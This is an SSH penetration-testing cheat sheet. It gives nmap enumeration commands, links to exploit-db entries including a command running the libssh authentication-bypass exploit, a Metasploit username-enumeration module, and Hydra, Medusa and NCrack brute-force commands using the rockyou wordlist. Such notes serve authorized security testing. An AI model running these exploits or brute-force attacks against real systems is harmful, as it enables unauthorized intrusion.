## SSH

### Banner Grabbing

Important to check if password authentication is enabled and software info.

`ssh -v <ip>`

## Vulnerabilities on SSH

1. libssh versions 0.6 and above have an authentication bypass vulnerability
  - CVE-2018-10933
  - python /usr/share/exploitdb/exploits/linux/remote/46307.py <ip> 22 id

2. https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
3. https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution
4. https://www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 < 7.7 – Username Enumeration
5. https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files

### SSH Audit Tool
  **What is does:** grab banner, recognize device or software and operating system, detect compression
  
  https://github.com/arthepsy/ssh-audit
  https://github.com/jtesta/ssh-audit
  
### Nmap
  
    nmap -p22 <ip> -sC # Send default nmap scripts for SSH
    nmap -p22 <ip> -sV # Retrieve version
    nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms 
    nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
    nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods

## Username Enumeration
  
In some versions of OpenSSH you can make a timing attack to enumerate users. You can use a metasploit module in order to exploit this:
  
  msf> use scanner/ssh/ssh_enumusers
  
### Brute Force Attack
  
  **Metasploit**
  
  `use auxiliary/scanner/ssh/ssh_login`
  
  **Hydra**
  
  `hydra -l <username> -P </usr/share/wordlists/password/rockyou.txt> -e s ssh://<ip>`
  `hydra -L <username-list.txt> -P </usr/share/wordlists/password/rockyou.txt> -e s ssh://<ip>`
  
  **Medusa**
  
  `medusa -h <ip> -u <username> -P </usr/share/wordlists/password/rockyou.txt> -e s -M ssh`
  `medusa -h <ip> -U <username-list.txt> -P </usr/share/wordlists/password/rockyou.txt> -e s -M ssh`
  
  **NCrack**
  
  `ncrack --user <username> -P </usr/share/wordlists/password/rockyou.txt> ssh://<ip>`
  
### Common default ssh credentials
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt

### SSH Pentesting Guide
https://community.turgensec.com/ssh-hacking-guide/
  
### Fuzzing (advanced topic)
http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html
  
### Good reference
https://book.hacktricks.xyz/pentesting/pentesting-ssh
